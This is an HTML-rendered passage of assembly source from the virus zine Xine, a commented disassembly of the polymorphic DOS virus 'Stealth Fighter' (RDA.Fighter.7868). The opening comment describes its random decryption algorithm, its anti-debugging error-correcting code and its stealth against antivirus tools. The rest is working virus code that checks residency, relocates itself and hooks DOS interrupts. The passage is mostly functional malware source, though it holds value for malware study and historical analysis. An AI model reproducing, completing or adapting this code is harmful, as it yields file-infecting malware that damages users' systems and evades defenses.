<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                                              ³ Xine - issue #5 - Phile 216 ³</span><span class="sc0">
</span><span class="sc1">;                                              ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; comment   *</span><span class="sc0">
</span><span class="sc1">; Virusname: Stealth Fighter, DEMO Part 3.2</span><span class="sc0">
</span><span class="sc1">; Other names: RDA.Fighter.7868</span><span class="sc0">
</span><span class="sc1">; Type: Poly TSR COM/EXE Semistealth</span><span class="sc0">
</span><span class="sc1">; Disasm:   Darkman and b0z0</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; General   description:</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;  This is a quite old but interesting DOS virus,   one of the first ones using</span><span class="sc0">
</span><span class="sc1">; the RDA, random   decryption algorithm, idea. With RDA the decryption method</span><span class="sc0">
</span><span class="sc1">; (so both keys and mathematical operations) will   not be stored in the</span><span class="sc0">
</span><span class="sc1">; decryptor. Indeed the RDA algorithm will try to   decrypt the encrypted body</span><span class="sc0">
</span><span class="sc1">; with all the possible implemented methods until   the right one will be</span><span class="sc0">
</span><span class="sc1">; choosen, this is when the virus   body will become plaintext. To decide if</span><span class="sc0">
</span><span class="sc1">; the virus body was sucesfully decrypted   the virus will compare the stored</span><span class="sc0">
</span><span class="sc1">; CRC, calculated   at decryptor generator, with the one calculated on the</span><span class="sc0">
</span><span class="sc1">; computed data. To make AV disinfection even harder the virus will encrypt</span><span class="sc0">
</span><span class="sc1">; a small   random part of the original host and decrypt it in memory just</span><span class="sc0">
</span><span class="sc1">; before executing it.</span><span class="sc0">
</span><span class="sc1">;  The virus includes also an ECC, error correcting code,   algorithm that is</span><span class="sc0">
</span><span class="sc1">; a piece   of code that can find, and in some cases also correct, modifications</span><span class="sc0">
</span><span class="sc1">; to the body of the virus. This is of course an interesting feature to prevent</span><span class="sc0">
</span><span class="sc1">; in memory patching/debugging of   the code. The ECC routine will be executed</span><span class="sc0">
</span><span class="sc1">; before and after each file infection.</span><span class="sc0">
</span><span class="sc1">;  The virus includes also a very   primitive interrupt tunneling routine and</span><span class="sc0">
</span><span class="sc1">; has semistealth   features (stealth on FCB/DTA findnext, correctly avoiding</span><span class="sc0">
</span><span class="sc1">; problems with CHKDSK).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Poly and RDA:</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;  The virus has an interesting and quite   big polymorphic engine. It can</span><span class="sc0">
</span><span class="sc1">; generate up to 8 layers   of decryption. It can generate quite a lot of different</span><span class="sc0">
</span><span class="sc1">; garbage   and encryption types. It is interesting that in the first part of the</span><span class="sc0">
</span><span class="sc1">; decryptor generation the virus will generate garbage instructions that will</span><span class="sc0">
</span><span class="sc1">; actually set up   the registers to some useful value for the real decryption</span><span class="sc0">
</span><span class="sc1">; stage (like the   key value). So there aren't any real obvious initialization</span><span class="sc0">
</span><span class="sc1">; steps of in the   decryptor. To encrypt the virus body (and other encryption</span><span class="sc0">
</span><span class="sc1">; layers)   the poly will just execute the generated decryptor in memory, to</span><span class="sc0">
</span><span class="sc1">; get the   same results from the garbage instructions, and then fix the memory</span><span class="sc0">
</span><span class="sc1">; changing instructions to the inverse ones. There are quite some   garbage</span><span class="sc0">
</span><span class="sc1">; instruction that can be   generated, with many int calls and also ax/al only</span><span class="sc0">
</span><span class="sc1">; opcodes. Browse   the i_table table in the source for a complete list.</span><span class="sc0">
</span><span class="sc1">;  The RDA decryptor generator (this layer is not   included in the 8 layers count</span><span class="sc0">
</span><span class="sc1">; of the previous   part) is created on a fixed structure basis. A generic model</span><span class="sc0">
</span><span class="sc1">; (starting from rda_basic_body label) will be filled with garbage instructions,</span><span class="sc0">
</span><span class="sc1">; taking care of not modifying the used registers. To accomplish this the   RDA</span><span class="sc0">
</span><span class="sc1">; uses a pretty big step description table, that tells how many bytes have to</span><span class="sc0">
</span><span class="sc1">; be copied from the generic model and then which   registers can garbage mess up</span><span class="sc0">
</span><span class="sc1">; and which not.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Well, enough word, here comes the fully commented code. Many longer</span><span class="sc0">
</span><span class="sc1">; explanations have been included   in the code at the most interesting parts,</span><span class="sc0">
</span><span class="sc1">; so we won't spend any more words in this short introduction :)</span><span class="sc0">
</span><span class="sc1">; *</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
 </span><span class="sc9">org</span><span class="sc0">   </span><span class="sc2">100h</span><span class="sc0">

 </span><span class="sc5">code_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">virus_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta_offset</span><span class="sc0">
</span><span class="sc5">delta_offset</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Load SI from stack (delta offset)</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_offset</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">31h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">)],</span><span class="sc12">'FS'</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">move_virus</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to move_virus</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">31h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">)],</span><span class="sc2">20h</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">virus_exit</span><span class="sc0">      </span><span class="sc1">; Above or equal? Jump to virus_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">runtim_patch</span><span class="sc4">],(</span><span class="sc5">runtim_patch</span><span class="sc4">-</span><span class="sc5">runtim_patch</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">move_virus</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">31h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">)],</span><span class="sc12">'FS'</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">31h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">)],</span><span class="sc2">20h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">data_</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; DI = offset of data_</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">data_end</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">       </span><span class="sc1">; Zero data_</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">data__</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; DI = offset of data__</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">data_end_</span><span class="sc4">-</span><span class="sc5">data_begin_</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">       </span><span class="sc1">; Zero data__</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">code_begin</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">resize_mem</span><span class="sc0">   </span><span class="sc1">; AX = offset of resize_mem</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; DI = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; AX =   "    "      "     "   "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">virus_begin</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">       </span><span class="sc1">; Move the virus below Program Seg...</span><span class="sc0">

         </span><span class="sc6">retf</span><span class="sc0">            </span><span class="sc1">; Return far</span><span class="sc0">
</span><span class="sc5">virus_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">encrypt_stat</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">vir_com_exit</span><span class="sc0">    </span><span class="sc1">; Host not encrypted? Jump to vir_...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">crypt_ptr</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; DI = file pointer to encrypted/d...</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">header_size_</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; DI = offset of encrypted data</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decrypt_host</span><span class="sc0">
</span><span class="sc5">vir_com_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">need_segovv</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">vir_exe_exit</span><span class="sc0">    </span><span class="sc1">; EXE executable? Jump to vir_exe_...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; DI = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">file_header</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SI = offset of file_header</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; Move the original code to beginning</span><span class="sc0">
         </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">;  "    "     "      "   "  "</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">virus_exit_</span><span class="sc0">
</span><span class="sc5">vir_exe_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; AX = segment of PSP for current ...</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">file_header</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; AX = initial SS relative to star...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SS =    "    "     "     "     "</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">file_header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; AX = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; AX = segment of beginning of EXE...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">file_header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save initial CS relative to star...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">file_header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">
</span><span class="sc5">virus_exit_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Zero BX</span><span class="sc0">

         </span><span class="sc6">retf</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'"RandomDecodingAlgorithmEngine 1.1"'</span><span class="sc0">
</span><span class="sc5">data_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">data_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">rda_checkvalue</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; contains the value calculated by</span><span class="sc0">
                    </span><span class="sc1">; rda to see if the body was correctly</span><span class="sc0">
                    </span><span class="sc1">; decrypted</span><span class="sc0">
</span><span class="sc5">head_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">file_header</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11001101b</span><span class="sc4">,</span><span class="sc2">00100000b</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11101000b</span><span class="sc0">       </span><span class="sc1">; CALL imm16 (opcode 0e8h)</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">17h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; File header</span><span class="sc0">
</span><span class="sc5">head_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">crypt_ptr</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File pointer to encrypted/decryp...</span><span class="sc0">
</span><span class="sc5">crypt_key</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Encryption/decryption key</span><span class="sc0">
</span><span class="sc5">crypt_length</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Length of encrypted/decrypted data</span><span class="sc0">
</span><span class="sc5">header_size</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Header size</span><span class="sc0">
</span><span class="sc5">encrypt_stat</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Status of host encryption</span><span class="sc0">
</span><span class="sc5">header_size_</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Header size</span><span class="sc0">
</span><span class="sc5">data_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">resize_mem</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">first_data</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">second_data</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">cache_stat</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; Examine if disk is cached</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc5">data_end__</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">      </span><span class="sc1">; Resize memory block</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">runtim_patch</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; Offset of runtime patch</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get_set_int</span><span class="sc0">
</span><span class="sc5">call_rda_fun</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">runtim_patch</span><span class="sc4">],(</span><span class="sc5">get_set_int</span><span class="sc4">-</span><span class="sc5">call_rda_fun</span><span class="sc4">)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0eeeeh</span><span class="sc0">       </span><span class="sc1">; RDA.7868 function</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">get_set_int</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tunnel_int13</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tunnel_int21</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int21_virus</span><span class="sc0">  </span><span class="sc1">; DX = offset of int21_virus</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int_addr</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 08h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int08_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int08_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int08_virus</span><span class="sc0">  </span><span class="sc1">; DX = offset of int08_virus</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int_addr</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_init_seed</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">ds_</span><span class="sc0">      </span><span class="sc1">; BX = offset of ds_</span><span class="sc0">
